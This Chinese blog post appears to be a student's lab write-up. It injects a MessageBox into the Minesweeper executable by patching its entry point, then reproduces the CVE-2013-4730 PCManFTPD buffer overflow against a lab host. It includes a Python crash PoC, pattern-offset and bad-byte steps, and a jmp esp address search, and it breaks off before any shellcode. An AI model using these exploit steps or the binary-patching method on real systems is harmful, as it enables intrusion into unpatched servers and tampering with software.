<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>逆向分析 | welcome2小神龙俱乐部</title><meta name="author" content="robe1t"><meta name="copyright" content="robe1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="# 逆向分析 # 针对 PE 文件的代码注入 # 实验介绍 通过对 windows xp  上的扫雷程序的分析，完成代码的注入，实现运行程序时也运行注入的代码 MSDN  对 MessageBox  函数的解释如下： 123456int MessageBox(     HWND hWnd,              // handle to owner window     LPCTSTR lpT">
<meta property="og:type" content="article">
<meta property="og:title" content="逆向分析">
<meta property="og:url" content="https://robe1t.github.io/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="welcome2小神龙俱乐部">
<meta property="og:description" content="# 逆向分析 # 针对 PE 文件的代码注入 # 实验介绍 通过对 windows xp  上的扫雷程序的分析，完成代码的注入，实现运行程序时也运行注入的代码 MSDN  对 MessageBox  函数的解释如下： 123456int MessageBox(     HWND hWnd,              // handle to owner window     LPCTSTR lpT">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://robe1t.github.io/img/me.jpg">
<meta property="article:published_time" content="2025-01-25T11:37:32.000Z">
<meta property="article:modified_time" content="2025-01-25T11:38:57.162Z">
<meta property="article:author" content="robe1t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://robe1t.github.io/img/me.jpg"><link rel="shortcut icon" href="/img/%E8%9B%8B%E7%B3%95.ico"><link rel="canonical" href="https://robe1t.github.io/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '逆向分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-01-25 19:38:57'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="welcome2小神龙俱乐部"><span class="site-name">welcome2小神龙俱乐部</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">逆向分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-25T11:37:32.000Z" title="发表于 2025-01-25 19:37:32">2025-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-25T11:38:57.162Z" title="更新于 2025-01-25 19:38:57">2025-01-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>79分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="逆向分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析">#</a> 逆向分析</h1>
<h2 id="针对pe文件的代码注入"><a class="markdownIt-Anchor" href="#针对pe文件的代码注入">#</a> 针对 PE 文件的代码注入</h2>
<h3 id="实验介绍"><a class="markdownIt-Anchor" href="#实验介绍">#</a> 实验介绍</h3>
<p>通过对 <code>windows xp</code>  上的扫雷程序的分析，完成代码的注入，实现运行程序时也运行注入的代码</p>
<p><code>MSDN</code>  对 <code>MessageBox</code>  函数的解释如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int MessageBox(  </span><br><span class="line">   HWND hWnd,              // handle to owner window  </span><br><span class="line">   LPCTSTR lpText,         // text in message box</span><br><span class="line">   LPCTSTR lpCaption,      // message box title</span><br><span class="line">   UINT uType              // message box style  </span><br><span class="line">);  </span><br></pre></td></tr></tbody></table></figure>
<p><code>hWind</code> ：消息框所属窗口的句柄，如果为 NULL，消息框则不属于任何窗口。</p>
<p><code>lpText</code> ：字符串指针，所指字符串会在消息框中显示。</p>
<p><code>lpCaption</code> ：字符串指针，所指字符串将成为消息框的标题。</p>
<p><code>uType</code> ：消息框的风格（单按钮、多按钮等），NULL 代表默认风格。</p>
<p>系统中并不存在真正的 <code>MessageBoxA</code>  函数，调用最终都将由系统按照参数中的字符串的 类型选择 “A” 类函数（ASCII）或者 “W” 类函数（UNICODE）调用，我们使用 <code>MessageBoxA</code>   编辑和注入代码</p>
<h3 id="实验过程"><a class="markdownIt-Anchor" href="#实验过程">#</a> 实验过程</h3>
<p>ollydbg 打开扫雷</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209160343800.png" alt="image-20241209160343800"></p>
<p>在程序下面的空白出插入代码，分别是字符 <code>PE Inject</code>  和 <code>You are Injected!</code> ，然后 <code>ctrl+A</code>  分析</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209161322709.png" alt="image-20241209161322709"></p>
<p>上面的每个语句后面都留了一行 00。因为，字符串后面是需要结束符 0x00 的。</p>
<p>接下来，构造函数调用的代码，包括：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0（默认风格）;   </span><br><span class="line">push 0x01004AA7（标题字符串地址）;   </span><br><span class="line">push 0x01004A9C（内容字符串地址）;   </span><br><span class="line">push 0（窗口归属）;   </span><br><span class="line">call MessageBoxA  </span><br></pre></td></tr></tbody></table></figure>
<p>注意，直接双击要修改的当前行（右边），就进入修改汇编代码的状态，如下：</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209161911983.png" alt="image-20241209161911983"></p>
<p>最终修改完的代码如下：</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209161858656.png" alt="image-20241209161858656"></p>
<h4 id="程序跳转"><a class="markdownIt-Anchor" href="#程序跳转">#</a> 程序跳转</h4>
<p>我们首先继续输入一条指令  <code>jmp 0x01003E21</code> 。这句话意思是我们运行完我们注入的弹 出对话框之后，会跳转到我们原来的这个 PE 文件的入口点，继续运行。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209163237096.png" alt="image-20241209163237096"></p>
<p>注意，上述修改是在原始文件副本里修改的，如果要保存修改，需要：</p>
<p>点鼠标右键，选择 “编辑 -&gt; 复制所有修改到可执行文件”(copy to executable-&gt;all  modifications-&gt;Copy all)，会弹出一个对话框，包含所有修改后的代码</p>
<p>在这个对话框空白处继续点右键 “编辑 -&gt; 保存文件”(backup-&gt;save data to  file)，弹出保存文件的界面，在这个里面选择保存类型为 “可执行文件或 DLL”，输入新 的文件名，比如 winmine1.exe，点保存即可。</p>
<p>到此，文件修改完毕，但是如果直接运行这个扫雷程序，并没有发生任何变化。因为， 我们只是编辑了一段代码，只有这些代码被运行了才算真正被注入。</p>
<h4 id="修改程序入口点"><a class="markdownIt-Anchor" href="#修改程序入口点">#</a> 修改程序入口点</h4>
<p><code>lordPE</code>  打开刚刚修改完保存的程序，选择 <code>PE Editor</code>  修改 <code>EntryPoint</code> （即程序入口点），修改成刚刚注入的那段代码第一句的地址，执行完注入的代码最后 jmp 回程序原入口点正常执行程序，先执行执行的代码再执行程序，这样就完成了 pe 程序的注入</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209163805009.png" alt="image-20241209163805009"></p>
<p>可以看到注入的代码是执行成功了的</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241209163727977.png" alt="image-20241209163727977"></p>
<h2 id="cve-2013-4730漏洞利用复现"><a class="markdownIt-Anchor" href="#cve-2013-4730漏洞利用复现">#</a> CVE-2013-4730 漏洞利用复现</h2>
<p>靶机 ip 为</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210115154286.png" alt="image-20241210115154286"></p>
<p>打开靶机上存在漏洞的服务器 <code>PCManFTPD2.exe</code> ，kali 上编写 poc 脚本如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">evil = <span class="string">'A'</span> * <span class="number">3000</span>  <span class="comment"># 构造 payload</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 连接到目标服务器</span></span><br><span class="line">    s.connect((<span class="string">'192.168.177.136'</span>, <span class="number">21</span>))    </span><br><span class="line">    <span class="comment"># 接收服务器的欢迎消息</span></span><br><span class="line">    <span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())  <span class="comment"># 将字节解码为字符串    </span></span><br><span class="line">    <span class="comment"># 发送 USER 命令</span></span><br><span class="line">    s.send((<span class="string">'USER '</span> + evil + <span class="string">'\r\n'</span>).encode())  <span class="comment"># 将字符串编码为字节</span></span><br><span class="line">    <span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())    </span><br><span class="line">    <span class="comment"># 发送 PASS 命令</span></span><br><span class="line">    s.send(<span class="string">'PASS anonymous\r\n'</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())  </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"An error occurred: <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行</p>
<p>靶机显示报错</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210115816257.png" alt="image-20241210115816257"></p>
<p>显示当前 EIP 是  <code>0x41414141</code> ，即 “AAAA” 的 ASCII 码，意味着程序存在缓冲区溢出，调整地址为我们输入的字符。</p>
<p>下载 mona.py 到如下路径</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210160508197.png" alt="image-20241210160508197"></p>
<h3 id="确认shellcode空间和eip指令的地址"><a class="markdownIt-Anchor" href="#确认shellcode空间和eip指令的地址">#</a> 确认 Shellcode 空间和 EIP 指令的地址</h3>
<p>设置 evil = <code>'A' * 1995</code> , 运行程序，发现正常连接服务器，证明 2000 不足以触发溢 出，因此考虑 （2000+3000）/2 = 2500</p>
<p>设置 evil = <code>'A' * 2000</code> , 运行程序，发现触发溢出异常，因此下一步选择   (2500+2000)/2=2250, 依次类推，不断的缩小范围。</p>
<p>设置 evil = <code>'A' * 2002</code> , 运行程序，触发异常，此时 EIP =  <code>0D414141</code> ，则意味着溢 出了，而且并不全部是 41.</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210163331657.png" alt="image-20241210163331657"></p>
<p>设置 evil = <code>'A'*1999 + 'B'*4</code> ，运行程序，触发异常，此时 EIP= <code>42424242</code> ， 正是我们是指的四个字符 B 对应的 ASCII 码。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210163131371.png" alt="image-20241210163131371"></p>
<h3 id="确定可用的shellcode空间"><a class="markdownIt-Anchor" href="#确定可用的shellcode空间">#</a> 确定可用的 Shellcode 空间</h3>
<p>设置 evil =  <code>'A'*1999 + 'B'*4 + 'C'*(3000-1999-4)</code> ，运行程序，触发异常，观察内 存中有多少个 C 是正常的。，一般的 shellcode 也就 500 个字节左右，所以 990 个字节的空间是够用的。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210164001723.png" alt="image-20241210164001723"></p>
<p>可以看到正常的 c 有 0x3DC+1 即 0x3DE=990</p>
<h3 id="基于唯一字符串来定位eip溢出地址"><a class="markdownIt-Anchor" href="#基于唯一字符串来定位eip溢出地址">#</a> 基于唯一字符串来定位 EIP 溢出地址</h3>
<p>kali 输入</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 3000</span><br></pre></td></tr></tbody></table></figure>
<p>创建 3000 个字符的唯一字符串，evil 复制为此字符串</p>
<p>再运行 poc，程序报错如下</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210164534957.png" alt="image-20241210164534957"></p>
<p><code>6f43366f</code>  转为字符即为 oC6o，再</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 6f43366f</span><br></pre></td></tr></tbody></table></figure>
<p>得到的偏移地址也是 1999</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210164902940.png" alt="image-20241210164902940"></p>
<h3 id="确认坏字节"><a class="markdownIt-Anchor" href="#确认坏字节">#</a> 确认坏字节</h3>
<p><code>!mona help</code>  会显示出 mona 命令下的帮助信息</p>
<p><code>!mona ba</code>  用来辅助查找坏字节 bad char</p>
<p><code>!mona ba -cpb "\x00"</code>  ，即产生不包含 “\x00” 的数字序列，结果为从 “\x01”…“\xff”</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210165853583.png" alt="image-20241210165853583"></p>
<p>会在程序根目录生成一个 <code>bytearray.txt</code>  文件，里面保存的就是生成的数字序列</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">badchar = (</span><br><span class="line">    <span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span></span><br><span class="line">    <span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">    <span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span></span><br><span class="line">    <span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">    <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span></span><br><span class="line">    <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">    <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span></span><br><span class="line">    <span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">    <span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span></span><br><span class="line">    <span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">    <span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span></span><br><span class="line">    <span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">    <span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span></span><br><span class="line">    <span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">    <span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span></span><br><span class="line">    <span class="string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
<p>复制这个数字序列给 badchar，来查找坏字节</p>
<p>设置 <code>evil = "A"*1999 + "B"*4 + badchar + "C"*(3000-1999-4-len(badchar))</code>   运行程序，触发异常，观察内存中从 01…ff 有哪些不正常，发现 "\x0A" 变成了 "\x00"，所 以 “\x0A” 是一个坏字节。从 “\x01”…“\xff"中去掉”\x0A", 重新运行，观察哪些坏 字节，发现 “\x0D” 也变成了 "\x00"，所以 “\x0D” 也是一个坏字节，去掉 “\x0D” 之后， 重新运行，观察坏字节，发现已经没有坏字节了，所以最后的坏字节为： “\x00\x0A\x0D”</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210171312195.png" alt="image-20241210171312195"></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210171527212.png" alt="image-20241210171527212"></p>
<h3 id="寻找跳转指令"><a class="markdownIt-Anchor" href="#寻找跳转指令">#</a> 寻找跳转指令</h3>
<p>输入 <code>!mona jmp -r esp</code>  指令</p>
<p>一样根目录生成一个 jmp.txt 文件，根据这个文件找到一个不包含 00 的地址 <code>0x77f8b257</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210173120789.png" alt="image-20241210173120789"></p>
<p>再 attack 一次进程， <code>immunitydbg</code>  中跳转到上面找到的地址，发现也确实是 <code>jmp esp</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210173219285.png" alt="image-20241210173219285"></p>
<p>设置 evil 的值为</p>
